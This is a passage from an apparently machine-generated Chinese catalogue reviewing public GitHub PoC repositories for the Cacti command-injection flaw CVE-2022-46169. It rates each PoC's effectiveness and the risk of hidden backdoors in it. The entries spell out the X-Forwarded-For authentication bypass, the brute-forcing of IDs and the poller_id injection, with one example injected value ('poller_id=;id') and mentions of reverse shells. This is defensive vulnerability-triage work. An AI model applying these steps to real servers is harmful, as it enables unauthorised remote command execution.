3.  脚本设置 `X-Forwarded-For` 头，伪造客户端 IP 地址，绕过身份验证。
4.  脚本发送 HTTP 请求到 `remote_agent.php`。
5.  如果目标 Cacti 实例存在具有 `POLLER_ACTION_SCRIPT_PHP` 操作类型的 `poller_item`，并且成功绕过身份验证，则服务器将执行 `poller_id` 参数中的恶意命令。
6.  脚本会检查响应中是否包含 "proc" 字符串，以确认命令是否已成功执行。
7.  如果命令执行成功，脚本将输出成功的消息，并显示成功利用的 `host_id`。

**项目地址:** [antisecc/CVE-2022-46169](https://github.com/antisecc/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #17

**来源**: [CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md](../2022/CVE-2022-46169-ariyaadinatha_cacti-cve-2022-46169-exploit.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例配置了 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti 1.2.23之前的版本中的一个命令注入漏洞。该漏洞允许未经身份验证的攻击者在运行Cacti的服务器上执行任意代码。漏洞存在于`remote_agent.php`文件中，该文件可以通过发送特制的HTTP请求进行访问。攻击者可以通过操纵`X-Forwarded-For` header 绕过身份验证,然后通过 `poller_id`参数执行命令注入。PoC代码利用了这一漏洞，首先验证目标是否存在漏洞，然后暴力破解 `host_id`和 `local_data_id`。 一旦这些ID被找到，攻击者就可以构造包含恶意payload的请求，从而在服务器上执行任意命令。

**有效性:**  提供的PoC代码有效，能够成功利用漏洞实现未经身份验证的远程命令执行。

**投毒风险:**  PoC代码主要功能是漏洞利用，并没有发现明显的恶意投毒代码，例如植入后门、篡改数据等。`cacti.py`脚本的主要功能是：
1.  检测目标是否存在漏洞。
2.  爆破 `host_id` 和 `local_data_id`。
3.  执行命令注入。
代码中唯一的潜在风险点是执行命令注入的payload。如果用户在不知情的情况下使用了危险的payload，可能会对系统造成损害，但是这种风险是用户自身行为造成的，并非代码本身存在恶意。

**利用方式:**
1.  攻击者发送包含`X-Forwarded-For` header的HTTP请求到`remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式获取可用的 `host_id` 和 `local_data_id`，这些ID对应于`poller_item`表中 `action` 字段为 `POLLER_ACTION_SCRIPT_PHP` (2) 的记录。
3.  攻击者构造包含恶意payload的HTTP请求，通过`poller_id`参数进行命令注入，从而在服务器上执行任意命令。

**项目地址:** [ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #18

**来源**: [CVE-2022-46169-copyleftdev_PricklyPwn.md](../2022/CVE-2022-46169-copyleftdev_PricklyPwn.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti服务器存在启用了 POLLER_ACTION_SCRIPT_PHP 的 poller_item

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵 HTTP Header (例如 X-Forwarded-For) 绕过身份验证，并向 remote_agent.php 发送特制的请求，注入恶意命令。漏洞的根本原因是 remote_agent.php 文件中的 polldata 操作在处理 poller_id 参数时，没有进行充分的过滤，导致攻击者可以在 proc_open 函数中执行任意命令。提供的漏洞利用代码 (PricklyPwn) 使用 Go 编写，通过爆破 host_id 和 local_data_ids，构造包含恶意命令的 URL，利用该漏洞获取反向 shell。

**有效性分析：**
漏洞利用代码通过 X-Forwarded-For 头绕过认证, 并爆破`host_id`和`local_data_ids`参数，构造恶意 URL 触发命令注入。根据漏洞信息，利用代码应该是有效的。

**投毒风险分析：**
该仓库包含一个Go编写的漏洞利用程序和一个自述文件。漏洞利用程序的功能是利用 CVE-2022-46169 在 Cacti 上执行命令。Readme文件提供了有关如何使用该漏洞利用程序的信息。虽然代码本身旨在利用已知漏洞，但需要审查是否存在任何隐藏的恶意代码。
*   **main.go:** 代码逻辑清晰，主要功能是构造 Payload 并发送请求以利用漏洞。其中未发现明显的恶意代码。然而，不能完全排除代码中存在细微的后门或漏洞的可能性，例如不正确的错误处理可能导致拒绝服务。
*   **readme.md:** 自述文件只包含有关漏洞利用程序的信息，没有发现任何可疑内容。

考虑到代码主要功能是漏洞利用，但存在一定潜在风险，因此投毒风险评估为10%。

**利用方式：**
1.  攻击者首先需要找到一个存在漏洞的 Cacti 实例 (版本低于 1.2.23)。
2.  攻击者设置`X-Forwarded-For`头为 Cacti 服务器的 IP 地址来绕过身份验证。
3.  攻击者通过爆破`host_id`和`local_data_ids`参数，寻找action类型设置为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。
4.  构造包含恶意命令的 URL，将其作为 poller_id 参数的值传递给 remote_agent.php。
5.  Cacti 服务器执行恶意命令，例如启动反向 shell 连接到攻击者控制的服务器。

**项目地址:** [copyleftdev/PricklyPwn](https://github.com/copyleftdev/PricklyPwn)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #19

**来源**: [CVE-2022-46169-dawnl3ss_CVE-2022-46169.md](../2022/CVE-2022-46169-dawnl3ss_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统安装Cacti，且存在类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。漏洞存在于`remote_agent.php`文件中，攻击者可以通过`X-Forwarded-For`头绕过身份验证，然后通过构造恶意的`poller_id`参数，在`poll_for_data`函数中使用`proc_open`执行任意命令。

**有效性：**
提供的PoC代码有效。它首先检查目标是否易受攻击，然后进行暴力破解以查找`host_id`和`local_data_id`，最后构造包含恶意payload的URL来执行命令。

**投毒风险：**
PoC代码本身看起来相对干净，主要功能是利用漏洞。但任何时候都存在一定的风险。漏洞利用代码中存在一定的风险，例如，要求用户输入IP地址和端口，然后构造反向shell的payload。虽然这是漏洞利用的一部分，但用户在复制粘贴代码时可能没有意识到这一点。由于代码的目的是演示漏洞，因此将此定义为恶意投毒是不准确的。风险评估如下：
  * 代码逻辑的直接目的并不是植入后门或执行恶意操作，而是为了演示漏洞利用，大部分操作都需要用户交互。
  * 潜在风险较低，主要体现在用户不理解反向shell的含义，直接运行可能导致自身暴露。
总的来说，投毒风险较低，预估为5%。

**利用方式：**
1.  **身份验证绕过：** 攻击者设置`X-Forwarded-For`头为Cacti服务器的IP地址，绕过`remote_agent.php`的身份验证。
2.  **查找有效ID：** 攻击者暴力破解`host_id`和`local_data_id`，找到`poller_item`表中`action`类型为`POLLER_ACTION_SCRIPT_PHP`的条目。
3.  **命令注入：** 攻击者构造包含恶意命令的`poller_id`参数，发送到`remote_agent.php`，服务器执行该命令。

**结论：** 此漏洞利用风险极高，因为无需身份验证即可远程执行代码。提供的PoC可以有效利用此漏洞，需要及时修补。

**项目地址:** [dawnl3ss/CVE-2022-46169](https://github.com/dawnl3ss/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #20

**来源**: [CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md](../2022/CVE-2022-46169-devAL3X_CVE-2022-46169_poc.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti实例运行，并且存在具有POLLER_ACTION_SCRIPT_PHP action的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于 Cacti 1.2.23 之前的版本中。这是一个未经身份验证的命令注入漏洞，允许攻击者在服务器上执行任意代码。攻击者通过伪造 HTTP Header `X-Forwarded-For` 绕过身份验证，然后向 `remote_agent.php` 发送包含恶意 `poller_id` 的 POST 请求，该 `poller_id` 包含要执行的命令。 漏洞利用的关键在于 `remote_agent.php` 中对 `poller_id` 参数的不安全处理，以及对客户端 IP 地址验证的绕过。

提供的 PoC 代码通过 Go 语言实现，利用了该漏洞。它允许指定目标 Cacti 实例的 URL，以及要执行的命令。PoC 代码首先尝试绕过身份验证，然后构造包含恶意命令的 POST 请求。如果成功，服务器将执行该命令，并将结果返回给攻击者。

该PoC未发现明显的投毒代码。主要功能是构造HTTP请求，发送到目标服务器，然后解析返回结果。代码中没有发现任何尝试连接恶意服务器，执行恶意操作或者写入恶意文件的行为。 风险分析基于对提供的PoC代码本身的分析，并不能完全排除其他潜在的风险（例如，如果从不可信的源下载该PoC，则可能存在其他风险）。 因此，为了安全起见，最好人工审核代码，或者从可信的来源获取代码。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP Header 为 Cacti 服务器的 IP 地址来绕过身份验证。
2.  **命令注入：** 攻击者构造一个包含恶意命令的 `poller_id` 参数，并通过 POST 请求将其发送到 `remote_agent.php`。
3.  **命令执行：** Cacti 服务器执行 `poller_id` 中包含的命令。

**漏洞利用有效性：**
根据漏洞描述、搜索结果和提供的PoC代码，此漏洞利用是有效的。PoC代码演示了如何利用此漏洞在目标系统上执行任意命令。



**项目地址:** [devAL3X/CVE-2022-46169_poc](https://github.com/devAL3X/CVE-2022-46169_poc)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #21

**来源**: [CVE-2022-46169-devilgothies_CVE-2022-46169.md](../2022/CVE-2022-46169-devilgothies_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在一个action类型为POLLER_ACTION_SCRIPT_PHP（值为2）的poller_item配置，并且可以通过HTTP访问remote_agent.php页面

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。该漏洞位于 `remote_agent.php` 文件中，攻击者可以通过构造特定的 HTTP 请求头来绕过身份验证，并通过 `poller_id` 参数注入恶意命令。漏洞利用过程如下：

1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` 等 HTTP 头，伪造客户端 IP 地址，使其与 Cacti 服务器本身的 IP 地址匹配。由于 Cacti 验证客户端 IP 地址的方式存在缺陷，攻击者可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 和恶意 `poller_id` 参数的请求。`poller_id` 参数中的值会被插入到 `proc_open` 函数的参数中，从而执行攻击者指定的命令。
3.  **利用代码分析：** 提供的PoC代码首先检查目标是否存在漏洞通过设置`X-Forwarded-For` http头。如果确认存在漏洞，则通过遍历`host_id`和`local_data_ids[]`来寻找配置正确的`poller_item`, 找到后，构造payload，执行反弹shell。
4. **投毒分析：** 检查PoC代码和README.md文件，未发现任何明显的恶意代码或后门。所有的代码都致力于利用此漏洞，没有发现有任何与预期功能不符的部分。因此，投毒风险评估为0%。

**总结：**
该漏洞允许未经身份验证的攻击者在目标系统上执行任意命令，风险极高。提供的PoC代码可以有效地利用该漏洞。该漏洞已被CISA列入已知被利用的漏洞目录（KEV）。

**项目地址:** [devilgothies/CVE-2022-46169](https://github.com/devilgothies/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #22

**来源**: [CVE-2022-46169-doosec101_CVE-2022-46169.md](../2022/CVE-2022-46169-doosec101_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中存在的一个未经身份验证的命令注入漏洞。漏洞位于`remote_agent.php`文件中。由于`get_client_addr`函数对客户端IP地址的验证不充分，攻击者可以通过设置`HTTP_`开头的`$_SERVER`变量来伪造IP地址，绕过身份验证。绕过身份验证后，攻击者可以通过`polldata`操作，利用`poller_id`参数中的命令注入漏洞，执行任意系统命令。

**漏洞利用方式：**
1.  攻击者发送包含`Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含恶意命令的`poller_id`参数，并将其作为`polldata`操作的一部分发送到`remote_agent.php`。
3.  服务器执行攻击者提供的恶意命令。

**有效性：**
提供的POC代码`CVE-2022-46169.py`是一个简单的漏洞检测脚本，它通过发送包含特定参数的HTTP GET请求到`remote_agent.php`来判断目标系统是否存在漏洞。该脚本并非完整的漏洞利用代码，但它可以用来验证目标系统是否容易受到攻击。

**投毒风险：**
分析了提供的POC代码和相关文件，没有发现明显的恶意代码或后门。`requirements.txt`中列出的依赖项`optparse`, `httpx`, `termcolor` 都是常见的Python库，没有已知的安全问题。作者隐藏的投毒代码可能性较低，风险评估为0%。

**项目地址:** [doosec101/CVE-2022-46169](https://github.com/doosec101/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #23

**来源**: [CVE-2022-46169-icebreack_CVE-2022-46169.md](../2022/CVE-2022-46169-icebreack_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行 (RCE)

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标服务器运行受影响版本的Cacti，且存在一个action类型为POLLER_ACTION_SCRIPT_PHP的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Cacti的remote_agent.php文件中。由于对客户端IP地址的验证存在缺陷，未经身份验证的攻击者可以通过设置X-Forwarded-For头部绕过身份验证，然后利用polldata动作中的命令注入漏洞执行任意命令。

**有效性：**
根据漏洞信息和提供的PoC代码，该漏洞是有效的。PoC代码利用了X-Forwarded-For头部的欺骗来绕过身份验证，然后通过构造包含恶意命令的poller_id参数来触发命令注入。

**投毒风险：**
PoC代码本身的功能是利用已知的漏洞进行攻击，并没有发现隐藏的恶意代码或后门。代码的功能较为清晰，主要包括发送HTTP请求、构造Payload等。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者发送包含`X-Forwarded-For`头的HTTP请求到`remote_agent.php`，将该头部设置为Cacti服务器的IP地址，绕过身份验证。
2.  攻击者构造一个包含恶意命令的`poller_id`参数，并将其作为GET请求参数发送到`remote_agent.php?action=polldata`。
3.  `remote_agent.php`在处理`polldata`动作时，会将`poller_id`参数插入到`proc_open`函数调用的命令中，导致命令注入。
4.  攻击者可以通过暴力破解`host_id`和`local_data_ids`参数，找到一个`action`类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，从而成功执行恶意命令。

**项目地址:** [icebreack/CVE-2022-46169](https://github.com/icebreack/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #24

**来源**: [CVE-2022-46169-lof1sec_CVE-2022-46169.md](../2022/CVE-2022-46169-lof1sec_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti实例存在具有POLLER_ACTION_SCRIPT_PHP（即action类型为2）的poller_item配置，并且攻击者可以访问remote_agent.php

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 存在于Cacti的`remote_agent.php`文件中，允许未经身份验证的攻击者执行任意代码。利用方式如下：

1.  **身份验证绕过：** 攻击者通过伪造`X-Forwarded-For` HTTP头，将其设置为运行Cacti服务器的IP地址，从而绕过身份验证。这是因为`get_client_addr`函数会读取这些HTTP头来确定客户端IP地址，并且之后通过`gethostbyaddr`解析IP地址为主机名，而Cacti服务器自身的主机名通常在`poller`表中存在，导致验证通过。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以利用`polldata`动作，该动作会使用`proc_open`执行PHP脚本。攻击者可以通过`poller_id`参数注入恶意命令。例如，`poller_id=;id`将执行`id`命令。
3.  **前提条件：** 要触发命令注入，必须存在一个`poller_item`，其`action`字段设置为`POLLER_ACTION_SCRIPT_PHP`（值为2）。`host_id`和`local_data_id`可以通过暴力破解找到。

**有效性：**

提供的PoC代码利用了上述漏洞。首先，它检查目标是否容易受到攻击（`checkVuln`函数）。然后，它通过暴力破解（`bruteForce`函数）确定有效的`host_id`和`local_data_id`。最后，它使用精心设计的payload（`remoteCodeExecution`函数）将恶意命令注入到`poller_id`参数中，从而在服务器上执行任意代码。由于CVE细节和搜索结果确认了此漏洞，PoC代码应有效。

**投毒风险：**

查看PoC代码和相关的README文件，未发现任何恶意或可疑的代码。PoC代码仅包含利用CVE-2022-46169漏洞的代码。因此，投毒风险为0%。

**搜索引擎结果：**

搜索引擎结果证实了CVE-2022-46169是一个未经身份验证的命令注入漏洞，影响Cacti的早期版本。多个来源都强调了该漏洞已被积极利用。


**项目地址:** [lof1sec/CVE-2022-46169](https://github.com/lof1sec/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md](../2022/CVE-2022-46169-m3ssap0_cacti-rce-cve-2022-46169-vulnerable-application.md)

## CVE-2022-46169 - Cacti 未授权命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
